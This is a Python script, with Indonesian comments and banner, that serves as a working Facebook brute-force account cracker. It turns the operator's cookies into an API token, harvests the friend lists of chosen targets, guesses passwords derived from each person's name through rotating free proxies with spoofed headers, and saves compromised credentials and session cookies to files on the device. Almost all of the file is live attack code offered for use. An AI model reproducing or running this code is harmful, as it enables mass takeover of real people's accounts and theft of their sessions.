#    *--> Script free
#    *--> Note kalo udah enak jangan di premiumin
import os

try:
    import bs4
    import rich
    import requests
    import stdiomask
except:
    os.system("pip install bs4")
    os.system("pip install rich")
    os.system("pip install requests")
    os.system("pip install stdiomask")

#----------[ IMPORT-MODULE ]----------#	    
import re,sys,json,time,datetime,random,requests
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.tree import Tree
from rich import print as prints
from rich import print as tpz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
ses=requests.Session()

#----------[ GLOBAL-NAME ]----------#	
id,id2,uid=[],[],[]
tokenefacebook,dump=[],[]
akunefacebook,method=[],[]
passwordku,passwordmu=[],[]
loop,ok,cp=0,0,0
version = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
ugen=["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"]
ugen2 = ["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"]

#----------[ WARNA ]----------#	
p = '\x1b[1;97m'# PUTIH
m = '\x1b[1;91m' # MERAH
k = '\x1b[1;93m' # KUJING
h = '\x1b[1;92m' # HIJAU
u = '\x1b[1;95m' # UNGU
b = '\x1b[1;94m' # BIRU
x = '\33[m' # DEFAULT

#----------[ STATUS-AKUN ]----------#	
bulan = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = bulan[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year

okc = "OK-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"
cpc = "CP-"+str(tgl)+"-"+str(bln)+"-"+str(thn)+".txt"

#----------[ ANIMASI-GANTENG ]----------#	
def __arf_x_ganteng__(gabutz_bang):
        for __arf_x_ganteng__ in gabutz_bang + "\n":sys.stdout.write(__arf_x_ganteng__);sys.stdout.flush();time.sleep(0.00)
        
def help():
	__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
	__arf_x_ganteng__(f"{k}└──[{m} pilih yg bener bro :-({x}")
	login_bro()

#----------[ HAPUS-TER ]----------#		
def clear():
    if "linux" in sys.platform.lower():
            try:os.system("clear")
            except:pass
    elif "win" in sys.platform.lower():
            try:os.system("cls")
            except:pass
  
#----------[ BANNER ]----------#	          
def banner():
  clear()
  print(f'''\t{m}
  _________   _____ _____________________
 /   _____/  /     \\______   \_   _____/
 \_____  \  /  \ /  \|    |  _/|    __)  
 {k}/        \/    Y    \    |   \|     \   
/_______  /\____|__  /______  /\___  /   
        \/         \/       \/     \/    
        {h} SIMPLE MULTI BRUTE FORCE''')
        
#----------[ LOGIN ]----------#	        
def login_creakerz():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenefacebook.append(token)
		try:
			muhammad_arf_xr = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenefacebook[0], cookies={'cookie':cok})
			aink_saha = json.loads(muhammad_arf_xr.text)['id']
			aink_cyxieon_xr = json.loads(muhammad_arf_xr.text)['name']
			menu(aink_saha,aink_cyxieon_xr)
		except KeyError:
			_seperjuangan_tapi_tak_senasib_()
		except requests.exceptions.ConnectionError:
		    __arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
		    __arf_x_ganteng__(f'{k}└──[{m} Koneksi anda bermasalah :-( {x}');exit()
	except IOError:
		_seperjuangan_tapi_tak_senasib_()

#----------[ LOGIN-COOKIES ]----------#	
def _seperjuangan_tapi_tak_senasib_():
	try:
		clear();banner()
		__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
		your_cookies = input(f'{k}└──[{x} Input cookies {h}: ')
		with requests.Session() as r:
		              r.headers.update({'content-type': 'application/x-www-form-urlencoded',
		              })
		              data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
		              response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text);code, user_code = response['code'], response['user_code'];verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		              r.headers.pop('content-type')
		              r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',
		              })
		              response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
		              if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
		               __arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
		               __arf_x_ganteng__(f"{k}└──[{m} Cookies anda Invalid :-({x}", end='\r');time.sleep(3.5)
		               print("                     ", end='\r')
		              else:
		                  action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '');fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1);jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1);data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,
		                  }
		                  r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',
		                  })
		                  response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
		                  if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
		                      r.headers.pop('content-type');r.headers.pop('origin');response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text;action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '');fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1);jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1);scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1);display = re.search('name="display" value="(.*?)"', str(response4)).group(1);user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1);logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1);auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1);encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1);return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1);r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',});data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,};response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text;windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '');r.headers.pop('content-type');r.headers.pop('origin');r.headers.update({'referer': 'https://m.facebook.com/',});response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
		                      if 'Sukses!' in str(response6):
		                          r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',});response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text;access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1);ken = open(".token.txt", "w").write(access_token);cok = open(".cok.txt", "w").write(your_cookies)
		                          __arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
		                          GG = input(f"{k}└──[{h} Tekan enter {x}");clear();login_creakerz()   
		                      else:
		                              __arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
		                              __arf_x_ganteng__(f"{k}└──[{m} Login gagal cek tumbal lo ngab :-({x}");exit()
	except Exception as e:
	       __arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
	       __arf_x_ganteng__(f"{k}└──[{m} Login gagal cek tumbal lo ngab :-(")
	       os.system('rm -rf .token.txt && rm -rf .cok.txt')
	       print(e);time.sleep(3);login_creakerz()

#----------[ MENU-CRACK ]----------#		       
def menu(aink_saha,aink_cyxieon_xr):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
		__arf_x_ganteng__("{k}└──[{m} Cookies anda kedaluarsa :-({x}")
		login_creakerz() 
	banner()
	__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
	__arf_x_ganteng__(f'{k}└──[{x} User  Id : {h}{aink_saha}{x}')
	__arf_x_ganteng__(f'{k}└──[{x} Username : {h}{aink_cyxieon_xr}{x}')
	__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
	__arf_x_ganteng__(f'{k}└──[{x} 01. Crack publik{x}')
	__arf_x_ganteng__(f'{k}└──[{x} 02. Cek result{x}')
	__arf_x_ganteng__(f'{k}└──[{x} 00. Ganti Cokies{x}')
	__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
	__gas_mas_bro__ = input(f'{k}└──[{x} Pilih : ')
	if __gas_mas_bro__ in ["1"]:
		__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
		kumpulkan = int(input(f'{k}└──[{x} Berapa target : '))
		if kumpulkan<1 or kumpulkan>100:
		    exit(f'{k}└──[{m} Gagal dump{x}')
		ses=requests.Session()
		__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────{x}")
		bilangan = 0
		for met in range(kumpulkan):
		    bilangan+=1	
		    _aink_masukan_berapa_idz_target_= input(f"{k}└──[{x}  Target ke "+str(bilangan)+f" : ")
		    uid.append(_aink_masukan_berapa_idz_target_)
		for userr in uid:
			try:
			    _grapt_facebook_idz_ = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenefacebook[0], cookies = {'cookies':cok}).json()
			    __arf_x_ganteng__(f"{k}╭────────────────────────────────────────────")
			    for arfxr in _grapt_facebook_idz_['friends']['data']:
			        id.append(arfxr['id']+'|'+arfxr['name']);sys.stdout.write('\r└──[ {}'.format(arfxr['id']));sys.stdout.flush();time.sleep(0.00040)
			except (KeyError,IOError):
			    pass
			except requests.exceptions.ConnectionError:
			    exit(f'{k}└──[{m} Sinyal problem{x}')
			try:
			    __arf_x_ganteng__(f"\n{k}╭────────────────────────────────────────────")
			    __arf_x_ganteng__(f"{k}└──[{x} Total target : "+str(len(id)))
			    atur_aink_sakit()
			except requests.exceptions.ConnectionError:
			    exit(f'{k}└──[{m} Gagal dump{x}')
			except (KeyError,IOError):
			    exit(f'{k}└──[{m} Tidak ada teman{x}')
	elif __gas_mas_bro__ in ["2"]:
	     exit(f"{k}└──[{m} dalam perbaiakan :-)")
	elif __gas_mas_bro__ in ["0"]:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		print(' exit ✓ ')
		exit()
	else:
	    __arf_x_ganteng__(f"{k}╭────────────────────────────────────────────")
	    exit(f'{k}└──[{m} Yang bener ster :-({x}')
	    
def atur_aink_sakit():
			for khusus_random in id:
			    cexieon_xr_gas_idz= random.randint(0,len(id2))
			    id2.insert(cexieon_xr_gas_idz,khusus_random)
			else:
			    atur_metode()	

#----------[ MENU-METODE ]----------#	
def atur_metode():
	__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────")
	__arf_x_ganteng__(f'{k}└──[{x} 01. Validate ')
	__arf_x_ganteng__(f'{k}└──[{x} 02. Asyinc ')
	__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────")
	__metode_krek_idz__ = input(f'{k}└──[{x} Input url : ')
	if __metode_krek_idz__ in ['1','01']:
		method.append('validate')
	elif __metode_krek_idz__ in ['2','02']:
		method.append('asyinc')
	else:
		method.append('validate')	
	wordlistxnx()	

#----------[ WORDLIST ]----------#		
def wordlistxnx():
	global prog,des
	__arf_x_ganteng__(f"{k}╭────────────────────────────────────────────")
	__arf_x_ganteng__(f"{k}└──[{x} MAINKAN MODE PESAWAT SETIAP 300 IDZ")
	__arf_x_ganteng__(f"{k}─────────────────────────────────────────────\n")
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as sorry_bang_gabutz_ribet_sc_nya:
			for vanilla in id2:
				idf,namamu_kusimpan = vanilla.split('|')[0],vanilla.split('|')[1].lower()
				aink_tersakiti = namamu_kusimpan.split(" ")[0]
				muhammad_arif_xr= []
				if len(namamu_kusimpan)<6:
					if len(aink_tersakiti)<3:
						pass
					else:
						muhammad_arif_xr.append(aink_tersakiti+'123');muhammad_arif_xr.append(aink_tersakiti+'1234');muhammad_arif_xr.append(aink_tersakiti+'12345');muhammad_arif_xr.append(aink_tersakiti+'321')
				else:
					if len(aink_tersakiti)<3:
						muhammad_arif_xr.append(namamu_kusimpan)
					else:
						muhammad_arif_xr.append(namamu_kusimpan)
						muhammad_arif_xr.append(aink_tersakiti+'123');muhammad_arif_xr.append(aink_tersakiti+'1234');muhammad_arif_xr.append(aink_tersakiti+'12345');muhammad_arif_xr.append(aink_tersakiti+'321')
				if '><semua><' in passwordku: 
					for passwordxxx in passwordmu:
						muhammad_arif_xr.append(passwordxxx)
				else:pass
				if "validate" in method:
				    sorry_bang_gabutz_ribet_sc_nya.submit(crackvalidate,idf,muhammad_arif_xr,"m.facebook.com")
				elif "asyinc" in method:
				    sorry_bang_gabutz_ribet_sc_nya.submit(crackasyinc,idf,muhammad_arif_xr,"m.facebook.com")
				else:
				    sorry_bang_gabutz_ribet_sc_nya.submit(crackvalidate,idf,muhammad_arif_xr,"m.facebook.com")
				    __arf_x_ganteng__(f"\n{k}╭────────────────────────────────────────────{x}")
	__arf_x_ganteng__(f'{k}└──[{x} OK {h}: %s'%(ok))
	__arf_x_ganteng__(f'{k}└──[{x} CP {k}: %s'%(cp))
	__arf_x_ganteng__(f"{k}─────────────────────────────────────────────{x}")

#----------[ METODE-VALIDATE ]----------#					    
def crackvalidate(idf,muhammad_arif_xr,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	emot = random.choice(["😝","😜","🤪"])
	prog.update(des,description=f"{x}{emot } {loop}/{len(id)} {h}OK : {ok} {k}CP : {cp}{x} ")
	prog.advance(des)
	for pw in muhammad_arif_xr:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			ua = random.choice(ugen)
			ua2 = random.choice(ugen2)
			nip=random.choice(proxs)
			proxs= {'http': 'socks4://'+nip}				
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=136148536485277&kid_directed_site=0&app_id=136148536485277&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fclient_id%3D136148536485277%26state%3Dfacebook%252Chttps%253A%252F%252Fwww.bhinneka.com%252F%26response_type%3Dcode%26sdk%3Dphp-sdk-5.4.4%26redirect_uri%3Dhttps%253A%252F%252Faccounts.bhinneka.com%252Flogin%26scope%3Demail%252Cpublic_profile%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1fbb0347-3dc1-45f6-b671-d892b34814c4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.bhinneka.com%2Flogin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebook%252Chttps%253A%252F%252Fwww.bhinneka.com%252F%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date ={"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
"uid":idf,
"next": "https://m.facebook.com/v10.0/dialog/oauth?client_id=136148536485277&state=facebook%2Chttps%3A%2F%2Fwww.bhinneka.com%2F&response_type=code&sdk=php-sdk-5.4.4&redirect_uri=https%3A%2F%2Faccounts.bhinneka.com%2Flogin&scope=email%2Cpublic_profile&ret=login&fbapp_pres=0&logger_id=1fbb0347-3dc1-45f6-b671-d892b34814c4&tp=unspecified",
"flow":"login_no_pin",
"pass":pw,
}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			head={
			'Host': url,
'cache-control': 'max-age=0',
'sec-ch-ua': '" Not A;Brand";v="98", "Chromium";v="112"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-platform': '"Android"',
'upgrade-insecure-requests': '1',
'origin': 'https://'+url,
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'x-requested-with': 'com.android.chrome',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': f'https://{url}/login.php?skip_api_login=1&api_key=136148536485277&kid_directed_site=0&app_id=136148536485277&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fclient_id%3D136148536485277%26state%3Dfacebook%252Chttps%253A%252F%252Fwww.bhinneka.com%252F%26response_type%3Dcode%26sdk%3Dphp-sdk-5.4.4%26redirect_uri%3Dhttps%253A%252F%252Faccounts.bhinneka.com%252Flogin%26scope%3Demail%252Cpublic_profile%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1fbb0347-3dc1-45f6-b671-d892b34814c4%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.bhinneka.com%2Flogin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfacebook%252Chttps%253A%252F%252Fwww.bhinneka.com%252F%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br',
'accept-language': version}
			po = ses.post(f'https://{url}/login/device-based/validate-password/?shbl=0',data=date,cookies={'cookie': koki},headers=head,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f"{k}╭────────────────────────────╮{x}")
				XiaoYan = Tree('')
				XiaoYan.add(f"{k}{idf}{x}").add(f"{k}{pw}{x}")
				XiaoYan.add(f"{m}{ua}{x}")
				print(f"{k}╰────────────────────────────╯{x}")
				prints(XiaoYan)
				open('/sdcard/CYXIEON-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akunefacebook.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f"{k}╭────────────────────────────╮{x}")
				XiaoYan = Tree("")
				XiaoYan.add(f"\r{h}{idf}{x}").add(f"{h}{pw}{x}").add(f"{h}{kuki}{x}")
				XiaoYan.add(f"{m}{ua}{x}")
				print(f"{k}╰────────────────────────────╯{x}")
				prints(XiaoYan)
				open('/sdcard/CYXIEON-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1      

#----------[ METODE-ASYINC ]----------#		 
def crackasyinc(idf,muhammad_arif_xr,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	emot = random.choice(["😝","😜","🤪"])
	prog.update(des,description=f"{x}{emot } {loop}/{len(id)} {h}OK : {ok} {k}CP : {cp}{x} ")
	prog.advance(des)
	for pw in muhammad_arif_xr:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			ua = random.choice(ugen)
			ua2 = random.choice(ugen2)
			nip=random.choice(proxs)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=286967629746546&kid_directed_site=0&app_id=286967629746546&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D286967629746546%26redirect_uri%3Dhttps%253A%252F%252Fwww.plazakamera.com%252Flord%252F%253FloginSocial%253Dfacebook%26state%3D2b811a83b1c1f1bafbb10765bbbde9ef%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da393ec69-90a6-492f-bc78-1e401d45d70e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.plazakamera.com%2Flord%2F%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2b811a83b1c1f1bafbb10765bbbde9ef%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': idf,
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': 'false',
'had_password_prefilled': 'false',
'is_smart_lock': 'true',
'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),
'pass': pw,
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
"__dyn": "",
"__csr": "",
"__a": "",
"__user": "0",
"_fb_noscript": "true"}
			head = {"Host": url,
"content-length": str(rr(2000,2199)),
"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
"sec-ch-ua-mobile": "?1",
"user-agent": ua,
"viewport-width": "360",
"content-type": "application/x-www-form-urlencoded",
"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
"sec-ch-ua-platform-version": f'"{str(rr(5,12))}.0.0"',
"x-asbd-id": "129477",
"x-requested-with": "com.android.chrome",
"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
"sec-ch-prefers-color-scheme": "light",
"sec-ch-ua-platform": '"Android"',
"accept": "*/*",
"origin": "https://"+url,
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty",
"referer": f"https://{url}/login.php?skip_api_login=1&api_key=286967629746546&kid_directed_site=0&app_id=286967629746546&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D286967629746546%26redirect_uri%3Dhttps%253A%252F%252Fwww.plazakamera.com%252Flord%252F%253FloginSocial%253Dfacebook%26state%3D2b811a83b1c1f1bafbb10765bbbde9ef%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da393ec69-90a6-492f-bc78-1e401d45d70e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.plazakamera.com%2Flord%2F%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2b811a83b1c1f1bafbb10765bbbde9ef%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"sec-websocket-version": str(rr(5,13)),
"accept-language": version}
			po = ses.post(f"https://{url}/login/device-based/login/async/?api_key=286967629746546&auth_token=b73311ca7950bbc7491068aad477bc17&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D286967629746546%26redirect_uri%3Dhttps%253A%252F%252Fwww.plazakamera.com%252Flord%252F%253FloginSocial%253Dfacebook%26state%3D2b811a83b1c1f1bafbb10765bbbde9ef%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da393ec69-90a6-492f-bc78-1e401d45d70e%26tp%3Dunspecified&refsrc=deprecated&app_id=286967629746546&cancel=https%3A%2F%2Fwww.plazakamera.com%2Flord%2F%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2b811a83b1c1f1bafbb10765bbbde9ef%23_%3D_&lwv=100", headers=head, data=date, allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}")
				tree.add(f"[bold yellow]{pw}").add(f"[bold yellow]{ua}{x}")
				tpz(tree)
				open('/sdcard/CYXIEON-CP/'+cpc,'a').write(idf+'|'+pw+'\n')		
				akunefacebook.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				tree = Tree(f" ")
				tree.add(f"[bold green]{idf}")
				tree.add(f"[bold green]{pw}")
				tree.add(f"[bold green]{kuki}").add(f"[bold green]{ua}{x}")
				tpz(tree)
				open('/sdcard/CYXIEON-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break				
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#----------[ CEK-TAPYES ]----------#		
def ceker(idf,pw):
	global cp
	ua = "Mozilla/5.0 (Linux; Android 10; DOOGEE B10 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.4427.43 Mobile Safari/537.36 Instagram 243.1.0.69.114 Android (30/11; 300dpi; 798x1777; DOOGEE; B10; B10; mt6833; it_IT; 339335856)"
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			XiaoYan = Tree("")
			XiaoYan.add(f"{h}Tapyes / A2f ( cek di mbasic ){x}")
			prints(XiaoYan)
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		XiaoYan = Tree("")
		XiaoYan.add(f"{m}{idf}{x}").add(f"{m}{pw}{x}")
		XiaoYan.add(f"{k}spam ip tidak dapat cek opsi")
		prints(XiaoYan)
		#open('sdcard/CYXIEON-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		#cp+=1

if __name__=='__main__':
	try:os.mkdir('git pull')
	except:pass
	try:os.system("clear")
	except:pass
	try:os.mkdir('/sdcard/CYXIEON-OK')
	except:pass
	try:os.mkdir('/sdcard/CYXIEON-CP')
	except:pass	   
	login_creakerz()
